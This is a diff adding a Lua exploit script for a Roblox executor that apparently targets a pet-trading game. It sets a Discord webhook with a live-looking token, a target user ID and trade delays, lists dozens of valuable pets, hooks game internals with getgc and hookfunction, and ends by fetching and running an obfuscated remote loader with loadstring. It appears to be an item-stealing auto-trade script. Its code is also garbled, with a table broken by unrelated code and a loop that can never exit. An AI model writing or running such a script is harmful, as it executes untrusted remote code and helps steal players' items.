@@ -1,0 +1,147 @@
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1480268741874028624/hWvBRyVK7igusPlQf-0oPQa9L28VP6zU3v2zkr3MwHj7gJLIXo77pa42w_jHVxpFqSdG"
+
+getgenv().TARGET_ID = 849110451
+
+getgenv().DELAY_STEP = 1      
+
+getgenv().TRADE_CYCLE_DELAY = 2 
+
+getgenv().Alikrarsaif4 = {
+
+wait(0.5)
+local adm = require(
+    game:GetService("ReplicatedStorage")
+        :WaitForChild("ClientModules")
+        :WaitForChild("Core")
+        :WaitForChild("UIManager")
+        :WaitForChild("Elements")
+        :WaitForChild("AboveCharStack")
+)
+
+local function isDelta()
+    return (typeof(getgenv) == "function" and getgenv().Delta ~= nil) or
+           (identifyexecutor and identifyexecutor():lower():find("delta"))
+end
+
+if isDelta() then
+    local dy = adm.destroy
+    adm.destroy = function(...)
+        local result = dy(...)
+        _G.CachedJobId = game.JobId
+        print(_G.CachedJobId)
+        adm.destroy = dy
+        return result
+    end
+
+    repeat
+        stepAnimate = nil
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name == "Alikrarsaif4" then
+                    Alikrarsaif4 = v
+                    break
+                end
+            end
+        end
+        task.wait()
+    until stepAnimate
+
+    local printed = false
+    old = hookfunction(stepAnimate, function(dt)
+        if not printed then
+            printed = true
+            _G.CachedJobId = game.JobId
+            print(_G.CachedJobId)
+        end
+        return old(dt)
+    end)
+end
+
+-- Cache the hashes before loading obfuscated script
+_G.CachedHashes = {}
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local upvalues = debug.getupvalues(v)
+        if type(upvalues[1]) == "table" then
+            for key, value in pairs(upvalues[1]) do
+                _G.CachedHashes[key] = value
+            end
+            break
+        end
+    end
+end
+     ["Dog"] = true,
+     ["Cat"] = true,
+     ["Buffalo"] = true,
+["Otter"] = true,
+["Robin"] = true,
+["Chicken"] = true,
+["Bandicoot"] = true,
+["Tasmanian Tiger"] = true,
+["Ground Sloth"] = true,
+["Stingray"] = true,
+["Dingo"] = true,
+["Puma"] = true,
+["Snow Cat"] = true,
+["Fennec Fox"] = true,
+["Snow Puma"] = true,
+["Chocolate Labrador"] = true,
+["Black Panther"] = true,
+["Capybara"] = true,
+["Meerkat"] = true,
+["Drake"] = true,
+["Silly Duck"] = true,
+["Pig"] = true,
+["Cow"] = true,
+["Elephant"] = true,
+["Hyena"] = true,
+["Rhino"] = true,
+["Polar Bear"] = true,
+["Brown Bear"] = true,
+["Reindeer"] = true,
+["Arctic Fox"] = true,
+["Wolf"] = true,
+["Swan"] = true,
+["Flamingo"] = true,
+["Lion"] = true,
+["Crocodile"] = true,
+["Turtle"] = true,
+["Kangaroo"] = true,
+["Dragon"] = true,
+["Unicorn"] = true,
+["Golden Unicorn"] = true,
+["Golden Dragon"] = true,
+["Golden Griffin"] = true,
+["Diamond Unicorn"] = true,
+["Diamond Dragon"] = true,
+["Diamond Griffin"] = true,
+["Shadow Dragon"] = true,
+["Bat Dragon"] = true,
+["Frost Dragon"] = true,
+["Giraffe"] = true,
+["Parrot"] = true,
+["Owl"] = true,
+["Crow"] = true,
+["Evil Unicorn"] = true,
+["Arctic Reindeer"] = true,
+["Monkey King"] = true,
+["Albino Monkey"] = true,
+["Cerberus"] = true,
+["Kitsune"] = true,
+["Robo Dog"] = true,
+["Guardian Lion"] = true,
+["Axolotl"] = true,
+["Phoenix"] = true,
+["Goldhorn"] = true,
+["Wyvern"] = true,
+["Hydra"] = true,
+["Shark"] = true,
+["Octopus"] = true,
+["Phoenix"] = true,
+["Ancient Dragon"] = true,
+["Lava Dragon"] = true,
+["Strawberry Shortcake Bat Dragon"] = true,
+["Vampire Dragon"] = true,
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
